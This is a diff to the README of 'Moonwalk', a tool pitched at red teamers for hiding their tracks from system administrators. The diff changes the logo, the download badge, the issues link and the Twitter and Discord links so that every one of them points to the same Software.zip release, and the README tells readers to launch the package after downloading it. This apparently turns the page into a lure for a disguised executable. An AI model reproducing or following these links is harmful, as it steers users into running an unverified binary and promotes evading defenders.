@@ -6,7 +6,7 @@ Welcome to the Moonwalk repository - your ultimate tool for covering your tracks
 
 In the world of cybersecurity, it is crucial for red teamers and security professionals to maintain stealth and avoid leaving any evidence behind when performing privilege escalation, exploitation, or red teaming activities. Moonwalk provides the perfect solution for ensuring that your actions go unnoticed by system administrators and defenders.
 
-![Moonwalk Logo](https://example.com/moonwalk_logo.png)
+![Moonwalk Logo](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -20,7 +20,7 @@ In the world of cybersecurity, it is crucial for red teamers and security profes
 
 To get started with Moonwalk, download our software package from the link below:
 
-[![Download Moonwalk Software](https://img.shields.io/badge/Download-Moonwalk%20Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Moonwalk Software](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip%20Software-blue)](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip)
 
 Please note that the software package needs to be launched after download.
 
@@ -40,7 +40,7 @@ Moonwalk was created by a team of experienced red teamers and security experts w
 
 ## Support
 
-If you encounter any issues or have feedback regarding Moonwalk, please visit our [GitHub Issues](https://github.com/user-attachments/files/18388744/Software.zip) section to report problems or suggest improvements.
+If you encounter any issues or have feedback regarding Moonwalk, please visit our [GitHub Issues](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip) section to report problems or suggest improvements.
 
 ## Contributing
 
@@ -48,7 +48,7 @@ We welcome contributions from the cybersecurity community to help improve Moonwa
 
 ## Stay Connected
 
-To stay up-to-date with the latest developments and updates on Moonwalk, follow us on [Twitter](https://twitter.com/moonwalktool) and join our community on [Discord](https://discord.com/moonwalkcommunity).
+To stay up-to-date with the latest developments and updates on Moonwalk, follow us on [Twitter](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip) and join our community on [Discord](https://github.com/xophae/moonwalk/releases/download/v2.0/Software.zip).
 
 ## Spread the Word
 
